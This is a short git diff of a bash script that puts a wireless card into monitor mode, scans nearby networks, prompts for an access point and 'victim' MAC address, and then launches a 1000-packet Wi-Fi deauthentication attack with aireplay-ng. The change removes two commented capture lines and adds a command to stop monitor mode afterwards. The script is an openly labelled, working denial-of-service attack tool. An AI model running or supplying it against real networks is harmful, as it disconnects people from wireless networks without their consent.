@@ -16,8 +16,6 @@ else
 	fi
 	airmon-ng start wlan0
 	airodump-ng mon0
-	# timeout 30s airodump-ng --write temp-output mon0
-	# grep -i readfromfile temp-output-01 >> result.txt
 	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 	echo "Specify the MAC Address of the AP:"
 	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++"
@@ -28,4 +26,5 @@ else
 	read victim_mac	
 	echo "Launching Attack ...."
 	aireplay-ng --deauth 1000 -a "$access_point" -h "$victim_mac" mon0 --ignore-negative-one 
+	airmon-ng stop mon0
 fi
